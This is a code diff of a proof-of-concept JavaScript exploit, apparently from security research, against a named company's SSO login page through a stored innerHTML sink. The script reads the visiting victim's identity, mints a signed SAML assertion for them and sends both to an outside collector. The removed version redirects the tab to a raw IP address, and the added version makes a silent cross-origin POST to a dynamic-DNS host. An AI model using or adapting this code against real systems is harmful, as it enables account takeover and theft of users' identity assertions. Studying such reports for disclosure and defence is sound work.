@@ -1,13 +1,11 @@
-// r22 PoC: attacker-authored JS, stored in the attacker's own Descope project, executed FIRST-PARTY
-// on https://sso.pub.databricks.com through the /login/{projectId} enriched-text innerHTML sink.
-// In ONE run it (1) reads the visiting victim's SSO identity, (2) mints a signed SAML assertion for
-// that victim using an attacker-supplied samlIdpStateId, and (3) exfiltrates both to the attacker's
-// collector. Benign: our own test victim, our own listener, our own Descope project.
+// r23 PoC: same stored sink, but the exfil is a SILENT cross-origin POST to an https collector the
+// attacker owns, so the victim's tab never leaves the Databricks page. CSP on the route is
+// connect-src 'self' https:, which permits any https destination.
 (async function(){
-  var P='P2fI1vZEAVlmwTIExz7Aec6Y0lLV';   // Databricks prod Descope project (public SDK token)
-  var H='https://auth.sso.pub.databricks.com';
-  var OOB='http://130.61.131.112';
-  var o={origin:(function(){try{return self.origin}catch(e){return '?'}})(),href:location.href};
+  var P='P2fI1vZEAVlmwTIExz7Aec6Y0lLV', H='https://auth.sso.pub.databricks.com';
+  var SINK='https://oob.sanlab-r19.dynv6.net:8443/r23-silent';
+  var o={origin:(function(){try{return self.origin}catch(e){return '?'}})(),href:location.href,
+         top:(function(){try{return (window.top||window.parent).location.href}catch(e){return 'blocked'}})()};
   var st='',app='SA35gbcNYD9HgQgYxFLY4jqBubVBl',flow='bevy-sign-up-and-sign-in';
   try{var h=((window.top||window.parent).location.hash)||'';
       var m=/st=([^&]+)/.exec(h); if(m)st=decodeURIComponent(m[1]);
@@ -32,11 +30,12 @@
     o.flowstart=r2.status; var j2=await r2.json();
     saml=((j2.samlIdpResponse||{}).samlResponse)||'';
     o.acs=((j2.samlIdpResponse||{}).url)||''; o.relay=((j2.samlIdpResponse||{}).relayState)||'';
-    o.assertion_len=saml.length; o.step=j2.stepName||'';
+    o.assertion_len=saml.length;
   }catch(e){o.fsErr=String(e);}
-  var u=OOB+'/r22-chain?victim='+encodeURIComponent(o.login||'none')
-       +'&uid='+encodeURIComponent(o.uid||'')+'&alen='+(o.assertion_len||0)
-       +'&meta='+encodeURIComponent(btoa(JSON.stringify(o)))
-       +'&saml='+encodeURIComponent(saml);
-  try{(window.top||window).location.href=u;}catch(e){location.href=u;}
+  try{
+    await fetch(SINK,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},
+                      body:JSON.stringify({meta:o,saml:saml})});
+    o.sent=true;
+  }catch(e){o.sendErr=String(e);}
+  try{window.__r23=o;}catch(e){}
 })();
